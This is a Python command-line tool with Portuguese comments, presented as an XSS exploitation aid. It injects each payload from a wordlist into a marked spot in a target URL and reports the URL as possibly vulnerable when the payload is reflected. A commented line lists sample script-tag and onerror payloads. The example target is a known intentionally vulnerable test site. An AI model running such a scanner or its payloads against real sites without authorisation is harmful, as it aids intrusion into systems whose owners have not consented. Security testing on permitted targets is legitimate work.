#!/bin/bash
#pt-br
#pip install requests
#pip install datatime
#pip install colorama
import threading
from turtle import color
import requests,argparse,pickle,base64
import os
from colorama import Fore
from datetime import datetime



def data():
    data_e_hora_atuais = datetime.now()
    data_e_hora_em_texto = data_e_hora_atuais.strftime('%d/%m/%Y  %H:%M')

    print(Fore.RED,'iniciado em : '+data_e_hora_em_texto+'\n')


#payloads = ['<script>alert("oi")</script>', '<img src=skwdkw onerror=alert("oi")>']


def banner():
    banner= '''
        DIRECT BY
         _                   _     _    _ _  _    __   _  _   
        | | _______   ____ _| |___| | _(_) || |  / _ \| || |  
        | |/ / _ \ \ / / _` | / __| |/ / | || |_| | | | || |_ 
        |   < (_) \ V / (_| | \__ \   <| |__   _| |_| |__   _|
        |_|\_\___/ \_/ \__,_|_|___/_|\_\_|  |_|  \___/   |_|   XSS-TOOL

    '''
    print(Fore.LIGHTMAGENTA_EX,banner)
    print(Fore.RESET,'Ferramenta criada em python3 com o objetivo em ajudar sua exploração de falhas xss. Probalidade de acerto de exploração é de 90%\n\nsem uso de multi-thread\n\n Para opções use o parametro -h ou --help\n\n')



def xss():
    parser= argparse.ArgumentParser(description="XSS tool")

    parser.add_argument('-u','--url',type=str, help='acrescente \'()\' no local da url onde deseja injetar o payload   http://testphp.vulnweb.com/search.php?test=()')
    parser.add_argument('-w','--wordlists', type=str, help='caminho da wordlist')
    args = parser.parse_args()

    word = args.wordlists

    os.system('clear')
    os.system('cls')


    banner()
    data()
    with open(word,'r', encoding='utf-8') as file:
        word = file.read().splitlines()



        for i in word:
            url = args.url
            url = url.replace("()",i)
            #print(url)
            req = requests.get(url)
            req_text = req.text


            if i in req_text:
                print(Fore.RESET,'---------------------------------------------------')
                print(Fore.GREEN,url,'  --------> possivelmente vulneravel! ')
                print(Fore.RESET,'---------------------------------------------------\n')
                
                
            #else:

                #print( Fore.RESET,i,'\t--------> não vulneravel\n')
                



def main():
    xss()

if __name__ == "__main__":
    main()